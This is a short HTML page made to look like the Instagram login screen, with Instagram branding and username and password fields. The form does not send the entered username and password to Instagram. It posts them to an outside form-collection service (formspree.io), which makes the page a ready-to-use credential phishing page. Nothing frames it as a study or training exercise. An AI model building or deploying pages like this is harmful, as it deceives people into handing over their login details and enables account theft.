<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
</head>
<body>
    <div class="image__login">
        <img src="img/instagramimg.png" alt="">
    </div>
    <div class="insta__form">
        <div class="login__form">
            <img src="img/instalogo.png">
            <form class="form" action="https://formspree.io/f/xpwzwkjl" method="post">
                <input type="text" placeholder="Phone number, username, or email" name="username">
                <input type="password" placeholder="Password" name="password">
                <button>
                    Log in
                </button>
            </form>
            <span class="forget">
                Forget Password ?
            </span>
        </div>
    </div>
</body>
</html>
